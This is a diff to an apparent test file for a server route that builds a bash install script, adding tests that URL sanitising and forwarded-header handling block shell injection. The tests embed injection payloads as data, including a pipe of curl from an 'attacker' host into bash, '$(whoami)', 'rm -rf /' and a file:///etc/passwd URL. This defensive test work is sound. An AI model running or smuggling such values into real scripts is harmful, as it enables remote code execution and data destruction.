@@ -14,9 +14,19 @@
 //     command with the engine URL pre-filled.
 
 import { describe, expect, test } from "bun:test";
-import { _internal } from "./install.ts";
+import { OpenAPIHono } from "@hono/zod-openapi";
+import type { AppEnv } from "../openapi.ts";
+import { _internal, registerInstallRoute } from "./install.ts";
 
 const { buildScript } = _internal;
+
+async function fetchScript(headers: Record<string, string>): Promise<string> {
+  const app = new OpenAPIHono<AppEnv>();
+  registerInstallRoute(app);
+  const res = await app.request("http://127.0.0.1/install", { headers });
+  expect(res.status).toBe(200);
+  return res.text();
+}
 
 describe("install script template", () => {
   test("starts with a bash shebang", () => {
@@ -126,5 +136,58 @@ describe("install script template", () => {
   test("points sk doctor as the verification step", () => {
     const script = buildScript("3.0.0", "https://engine.example.com");
     expect(script).toContain("sk doctor");
+  });
+});
+
+describe("sanitizeBaseUrl", () => {
+  test("strips path/query/fragment down to protocol//host", () => {
+    expect(_internal.sanitizeBaseUrl("https://engine.example.com/foo?x=1#y")).toBe(
+      "https://engine.example.com",
+    );
+  });
+
+  test("accepts a host:port and bracketed IPv6", () => {
+    expect(_internal.sanitizeBaseUrl("http://10.0.0.5:3000")).toBe("http://10.0.0.5:3000");
+    expect(_internal.sanitizeBaseUrl("http://[::1]:8080")).toBe("http://[::1]:8080");
+  });
+
+  test("rejects non-http(s) schemes", () => {
+    expect(_internal.sanitizeBaseUrl("file:///etc/passwd")).toBeNull();
+    expect(_internal.sanitizeBaseUrl("ftp://host/x")).toBeNull();
+  });
+
+  test("rejects or neutralizes hosts carrying shell metacharacters", () => {
+    for (const evil of [
+      'https://evil.com"; curl http://attacker/x.sh | bash; echo "',
+      "https://evil.com$(whoami)",
+      "https://evil.com;rm -rf /",
+    ]) {
+      const out = _internal.sanitizeBaseUrl(evil);
+      if (out !== null) {
+        expect(out).not.toMatch(/[;"'`$|\s]/);
+      }
+    }
+  });
+});
+
+describe("GET /install — header injection", () => {
+  test("a forged X-Forwarded-Host cannot inject shell into the script", async () => {
+    const script = await fetchScript({
+      "x-forwarded-host": 'evil.example.com"; curl http://attacker/x.sh | bash; echo "',
+      "x-forwarded-proto": "https",
+    });
+    // The malicious payload must not survive anywhere in the script.
+    expect(script).not.toContain("attacker");
+    expect(script).not.toContain("| bash; echo");
+    // ENGINE_URL falls back to the safe request origin, not the forged host.
+    expect(script).toContain('ENGINE_URL="http://127.0.0.1"');
+  });
+
+  test("a clean X-Forwarded-Host is honoured", async () => {
+    const script = await fetchScript({
+      "x-forwarded-host": "engine.example.com",
+      "x-forwarded-proto": "https",
+    });
+    expect(script).toContain('ENGINE_URL="https://engine.example.com"');
   });
 });
